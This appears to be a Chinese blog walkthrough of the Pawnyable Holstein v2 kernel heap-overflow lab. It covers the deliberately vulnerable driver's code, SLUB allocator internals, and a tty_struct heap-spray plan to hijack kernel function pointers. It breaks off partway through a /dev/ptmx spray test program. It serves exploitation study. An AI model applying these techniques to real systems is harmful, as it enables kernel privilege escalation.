punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefile：</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O0<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用的5.15.0的内核</p><h1 id="一、LK01-2-Holstein-v2"><a href="#一、LK01-2-Holstein-v2" class="headerlink" title="一、LK01-2 Holstein v2"></a>一、LK01-2 Holstein v2</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v2 (KL01-2) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kptr_restrict为2，dmesg_restrict为1，内核日志非root不可见</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">1</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开了kaslr</p><h3 id="vuln-ko"><a href="#vuln-ko" class="headerlink" title="vuln.ko"></a>vuln.ko</h3><p>什么保护都没有</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">51</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./vuln.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="module-initialize"><a href="#module-initialize" class="headerlink" title="module_initialize"></a>module_initialize</h4><p>在&#x2F;dev下注册了一个名为 holstein 的设备</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_50E<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_A60 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_52B<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_46A<span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">_kmalloc</span><span class="token punctuation">(</span><span class="token number">0x400LL</span><span class="token punctuation">,</span> <span class="token number">06300LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> g_buf <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_480<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">4294967284LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分配了一个0x400的内存块</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 kbuf<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-10h]</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_491<span class="token punctuation">)</span><span class="token punctuation">;</span>  kbuf <span class="token operator">=</span> g_buf<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">>=</span> <span class="token number">0x80000000</span> <span class="token punctuation">)</span>                       <span class="token comment">// 检查size</span>    <span class="token function">BUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">check_object_size</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4A7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_to_user(buf, kbuf, size)，kbuf&#x3D;g_buf</p><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 kbuf<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-8h]</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4BE<span class="token punctuation">)</span><span class="token punctuation">;</span>  kbuf <span class="token operator">=</span> g_buf<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token operator">>=</span> <span class="token number">0x80000000</span> <span class="token punctuation">)</span>    <span class="token function">BUG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">check_object_size</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> a3<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> a3<span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4D5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>copy_from_user(kbuf, buf, size)，kbuf&#x3D;g_buf</p><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_4EE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二-利用思路"><a href="#二-利用思路" class="headerlink" title="(二)利用思路"></a>(二)利用思路</h2><h3 id="内核堆内存分配策略"><a href="#内核堆内存分配策略" class="headerlink" title="内核堆内存分配策略"></a>内核堆内存分配策略</h3><p>在内核中，我们可以使用mmap以页（page）为基本单位进行内存分配，但是这会导致很多空间浪费，因为很多时候并不需要这么大的内存空间。因此，与用户空间中的malloc函数类似，我们可以在内核中使用kmalloc函数申请内存。kmalloc使用了内核中的分配器，主要有SLAB、SLUB和SLOB三种。这三个分配器之间并不是完全独立的，在实现上有共同的部分，统称为Slab（厚板）分配器。</p><ol><li><code>SLAB</code>是以上三者中最古老的分配器类型，最早由Jeff Bonwick在Solaris系统中引入，其在Linux中的代码实现位于mm&#x2F;slab.c。</li><li><code>SLUB</code>的意思是the unqueued slab allocator，由Christoph Lameter设计，适用于大型系统，它的特点是尽可能快，在Linux中的代码实现位于mm&#x2F;slub.c。自2.6.23版本后，<strong>Linux内核用SLUB取代SLAB，作为默认的内存分配器</strong>。因此，后续我们主要关注的是针对SLUB分配器的攻击方式。</li><li><code>SLOB</code>的意思是simple list of blocks，主要用于嵌入式系统，特点是尽可能轻量，在Linux中的代码实现位于mm&#x2F;slob.c。</li></ol><p>接下来，我们简单介绍一下每个分配器的具体实现。个人认为，在初次探索时不要陷入琐碎的细节，否则容易只见树木不见森林，或者丧失动力。先了解机制和策略层面的设计，然后结合具体的漏洞调试来观察细节，如有必要，再回过头来阅读分配器实现代码，这样的流程可能更有利于学习。从攻击者的视角出发，我们需要重点关注每个分配器的以下两个关键点：</p><ol><li>根据要分配的内存大小，分配器从哪里切块（获得内存）。</li><li>在后续的分配中，分配器如何管理和重用已经释放的内存。</li></ol><hr><ul><li>SLAB分配器<br>SLAB分配器有以下三个特点：</li></ul><ol><li><strong>根据大小使用不同的页框</strong><br>根据所需内存大小使用不同的页框。与libc malloc的内存分配方式不同，SLAB根据内存需求的大小分配来自不同区域的内存。因此，分配的内存块前后没有（不需要）长度信息。</li><li><strong>缓存使用</strong><br>使用缓存。对于小内存的分配情况，优先使用对应的缓存。如果所需的内存很大，或者缓存为空，则采用正常的分配机制。</li><li><strong>使用位图（索引）管理空闲空间</strong><br>使用位图管理已释放区域。在内存页的顶部维护了一个位数组，用于表示该页是否已释放特定索引的区域。与libc malloc的内存管理方式不同，它并未基于链表管理。<br><img src="/EXP_FILE/0cb27e8862ef08e2402663871a61642f_MD5.jpeg"></li></ol><ul><li>SLUB分配器<br>SLUB分配器有以下三个特点：</li></ul><ol><li><strong>如何根据尺寸使用页框</strong><br>与SLAB类似，SLUB根据所需内存大小使用不同的页框（kmalloc-64、kmalloc-128、kmalloc-256等等）。不同的是，SLUB管理的页框的开头没有元数据（如空闲区索引）。页框描述符中有指向空闲链表开头的指针。</li><li><strong>使用单向列表管理空闲空间</strong><br>与libc的tcache和fastbin类似，SLUB使用单向链表管理空闲区域。</li><li><strong>缓存使用情况</strong><br>与SLAB类似，每个CPU都有一个cache，但是SLUB同样是用单向链表来维护它们的。<br><img src="/EXP_FILE/06e39f71009be8104b8fcf8cdcfe25fd_MD5.jpeg"><br>其中，通用kmem_cache的大小覆盖了8、16、32、64、96、128、192、256、512、1024、2048、4096和8192</li></ol><ul><li>SLOB分配器<br>当前我们暂不关注SLOB分配器，因此暂时略去这段内容。等日后有需要时再回过头学习。</li></ul><h3 id="堆溢出漏洞利用思路"><a href="#堆溢出漏洞利用思路" class="headerlink" title="堆溢出漏洞利用思路"></a>堆溢出漏洞利用思路</h3><p>内核堆由所有驱动程序和内核共享。因此，一个驱动程序中的漏洞可用于破坏内核空间中的另一个对象。那么，一个非常自然的思路是想办法在脆弱对象后面放一些想要破坏的目标对象，从而通过堆溢出篡改这些目标对象。如前所述，SLUB管理的对象之间没有元数据，因此不必考虑堆溢出可能会破坏这些元数据。</p><p>堆溢出的一种常见利用手法是<code>堆喷（Heap Spraying）</code>，它能够提高堆溢出漏洞利用的成功率和稳定性。所谓堆喷，就是在堆上（无论是内核堆还是用户态堆）大量申请内存，并填充特定载荷。值得注意的是，堆喷是一种通用的漏洞利用辅助技术，并不局限在堆溢出漏洞利用中。目前我见到过两种堆喷利用场景：</p><ol><li>在用户态PWN中，利用某个漏洞能够将控制流劫持到堆上。在这种情况下，可以通过堆喷“nop雪橇+shellcode”的方式对堆进行布局，使得劫持的目标堆地址大概率命中nop雪橇部分，从而抵消掉相当一部分随机化导致的不确定性，实现代码执行。</li><li>在内核态PWN中，堆溢出漏洞的利用。在这种情况下，利用系统调用或漏洞模块交互，在堆上放置大量脆弱对象及一些目标对象，使得脆弱对象中的堆溢出漏洞被触发时，大概率其后是一个目标对象，实现对目标对象的篡改。</li></ol><p>SLUB的特性决定了只有大小相同的对象才会从同一个<code>kmem_cache</code>区域分配，因此我们要根据脆弱对象的大小来选择目标对象。“目标对象的选择”这个话题本身就是值得写一篇文章来讨论、积累了，原教程作者也确实写了一篇<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">文章</a>来记录他常用到的目标对象。</p><hr><p>从前文可知，漏洞模块中每次申请的内存大小为0x400，即1024，因此我们需要找到一个同样从kmalloc-1024区域分配的内核对象。<code>tty_struct</code>正是符合条件的内核对象（大小通常在0x2c0左右），它定义在<a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L122">include&#x2F;linux&#x2F;tty.h</a>中</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">tty_struct</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span>magic<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">kref</span> kref<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">device</span> <span class="token operator">*</span>dev<span class="token punctuation">;</span><span class="token comment">/* class device or NULL (e.g. ptys, serdev) */</span><span class="token keyword">struct</span> <span class="token class-name">tty_driver</span> <span class="token operator">*</span>driver<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">tty_operations</span> <span class="token operator">*</span>ops<span class="token punctuation">;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，<code>tty_operations *ops</code>在结构体中的偏移是0x18，它包含了相关的操作函数，它们定义在<a href="https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c">drivers&#x2F;tty&#x2F;pty.c</a>中。例如，当我们对<code>/dev/ptmx</code>执行open系统调用时，对应的操作函数<a href="https://elixir.bootlin.com/linux/v5.15/source/drivers/tty/pty.c#L788"><code>ptmx_open</code></a>将被执行：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> ptmx <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">"/dev/ptmx"</span> <span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在借助堆喷手法成功布置内核堆后，我们通常利用堆溢出漏洞篡改目标对象的特定函数指针，或者伪造一个函数指针表，然后在用户空间对目标对象执行系统调用，从而触发它的相应操作函数，由于该函数指针已经被篡改为一个恶意的地址，内核控制流将被劫持。</p><h3 id="堆喷射"><a href="#堆喷射" class="headerlink" title="堆喷射"></a>堆喷射</h3><p>就像之前研究栈溢出一样，我们先编写一个简单的程序来触发堆溢出，然后在GDB中看一看溢出时堆内存的布局是怎样的</p><pre class="line-numbers language-c" data-language="c"><div class="caption"><span>TI:"测试代码"</span></div><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> spray<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span 